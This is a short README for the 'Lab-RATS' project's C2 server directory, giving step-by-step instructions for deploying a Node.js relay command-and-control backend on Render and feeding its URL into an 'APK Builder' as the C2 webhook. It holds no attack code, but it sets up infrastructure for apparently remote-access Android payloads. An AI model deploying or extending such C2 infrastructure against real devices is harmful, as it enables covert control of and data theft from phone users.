# Lab-RATS Tactical C2 Backend (`/c2-server`)

This directory contains the Node.js / Express backend server designed for deploying a relay C2 instance on **Render**, **Railway**, or **Fly.io** (Option 2 in the README).

## Quick Deployment on Render (`https://render.com`)

1. Create a new **Web Service** on Render and connect your Lab-RATS repository.
2. Set the **Root Directory** to `c2-server`.
3. Set the **Build Command** to `npm install`.
4. Set the **Start Command** to `npm start`.
5. Deploy! Once live, copy your Render URL (e.g., `https://labrats-c2.onrender.com`).
6. Enter this URL into the APK Builder when prompted for the C2 Webhook URL.
